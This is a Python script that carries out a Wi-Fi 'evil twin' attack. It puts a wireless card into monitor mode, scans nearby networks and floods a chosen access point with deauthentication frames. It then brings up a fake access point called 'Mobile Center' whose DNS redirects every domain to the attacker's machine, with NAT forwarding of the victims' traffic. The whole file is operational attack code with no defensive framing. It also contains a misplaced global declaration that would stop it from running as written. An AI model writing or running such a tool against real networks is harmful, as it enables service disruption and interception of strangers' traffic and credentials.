#!/usr/bin/env python3
import os
import subprocess
import signal
import sys

SSID = "Mobile Center"
INTERFACE = "wlan0mon"
CHANNEL = "6"  # Change this to your target WiFi channel

def run_command(cmd):
    print(f"[+] Running: {cmd}")
    os.system(cmd)

def start_monitor_mode(interface):
    run_command("sudo airmon-ng check kill")
    run_command(f"sudo airmon-ng start {interface}")

def stop_monitor_mode(interface):
    run_command(f"sudo airmon-ng stop {interface}")

def scan_wifi(interface):
    print("[*] Starting WiFi scan... (press Ctrl+C to stop)")
    try:
        subprocess.run(["sudo", "airodump-ng", interface])
    except KeyboardInterrupt:
        print("[*] Scan stopped")

def deauth_target(bssid, interface):
    print(f"[*] Starting deauth attack on {bssid}...")
    run_command(f"sudo aireplay-ng --deauth 100 -a {bssid} {interface}")

def write_hostapd_conf():
    conf = f"""
interface={INTERFACE}
driver=nl80211
ssid={SSID}
hw_mode=g
channel={CHANNEL}
macaddr_acl=0
ignore_broadcast_ssid=0
"""
    with open("hostapd.conf", "w") as f:
        f.write(conf)

def write_dnsmasq_conf():
    conf = f"""
interface={INTERFACE}
dhcp-range=192.168.10.10,192.168.10.50,12h
address=/#/192.168.10.1
"""
    with open("dnsmasq.conf", "w") as f:
        f.write(conf)

def setup_network():
    run_command(f"sudo ifconfig {INTERFACE} 192.168.10.1 netmask 255.255.255.0 up")
    run_command("sudo sysctl -w net.ipv4.ip_forward=1")
    run_command("sudo iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE")
    run_command(f"sudo iptables -A FORWARD -i {INTERFACE} -j ACCEPT")

def cleanup():
    run_command("sudo iptables -t nat -D POSTROUTING -o eth0 -j MASQUERADE")
    run_command(f"sudo iptables -D FORWARD -i {INTERFACE} -j ACCEPT")
    run_command(f"sudo ifconfig {INTERFACE} down")
    stop_monitor_mode(INTERFACE.replace('mon',''))
    print("[*] Cleanup done. Exiting.")

def start_hostapd():
    return subprocess.Popen(["sudo", "hostapd", "hostapd.conf"])

def start_dnsmasq():
    return subprocess.Popen(["sudo", "dnsmasq", "-C", "dnsmasq.conf"])

def main():
    # Setup monitor mode on wlan0
    start_monitor_mode("wlan0")
    print("[*] Monitor mode enabled on wlan0mon")

    # Scan phase - user can note BSSID & Channel manually or skip
    scan_wifi("wlan0mon")
    print("[*] Please note the BSSID and Channel of your target WiFi.")
    bssid = input("Enter BSSID of target to deauth (or leave empty to skip): ").strip()
    channel_input = input(f"Enter target channel (default {CHANNEL}): ").strip()
    global CHANNEL
    if channel_input:
        CHANNEL = channel_input
    write_hostapd_conf()
    write_dnsmasq_conf()
    setup_network()

    if bssid:
        deauth_target(bssid, "wlan0mon")

    print("[*] Starting fake AP...")
    hostapd_proc = start_hostapd()
    dnsmasq_proc = start_dnsmasq()

    try:
        hostapd_proc.wait()
        dnsmasq_proc.wait()
    except KeyboardInterrupt:
        print("[*] Stopping...")
        hostapd_proc.terminate()
        dnsmasq_proc.terminate()
        cleanup()
        sys.exit(0)

if __name__ == "__main__":
    main()
